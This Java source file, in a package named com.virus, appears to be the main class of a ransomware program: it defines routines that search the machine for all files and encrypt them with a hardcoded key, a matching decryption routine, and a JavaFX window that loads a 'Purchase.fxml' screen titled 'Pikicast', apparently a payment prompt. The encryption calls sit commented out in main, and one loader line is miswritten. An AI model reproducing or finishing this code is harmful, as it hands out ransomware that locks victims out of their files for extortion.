package com.virus;


import com.virus.security.CryptoUtils;
import com.virus.security.SearchDirectory;
import javafx.application.Application;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.paint.Color;
import javafx.stage.Stage;

import java.io.File;
import java.util.ArrayList;

public class Main extends Application {

    public static SearchDirectory searchDirectory = new SearchDirectory();

    public static String key = "Mary has onecat1";

    public static void main(String[] args) {
        Thread t1 = new Thread(() -> {
            //encryption();
            //decryption();
        });
        Thread t2 = new Thread(() -> {
            launch(args);
        });


        t1.start();
        t2.start();

    }



    public static void encryption() {
        ArrayList<File> files = searchDirectory.allFileSearch();
        CryptoUtils.encrypt(files, key);
        searchDirectory.clearFiles();
    }

    public static void decryption() {
        ArrayList<File> encrypted_files = searchDirectory.decryptSearch();
        CryptoUtils.decrypt(encrypted_files, key);
        searchDirectory.clearFiles();
    }

    @Override
    public void start(Stage stage) throws Exception {
        FXMLLoader loader = FXMLLoader.load(getClass().getResource("Purchase.fxml"));
        Parent root = loader.load();
        PurchaseController controller = loader.getController();
        //controller.setHostServices(getHostServices());

        Scene scene = new Scene(root);
        scene.setFill(Color.TRANSPARENT);
        stage.setScene(scene);
        stage.setTitle("Pikicast");
        stage.setResizable(false);

        stage.show();
    }
}
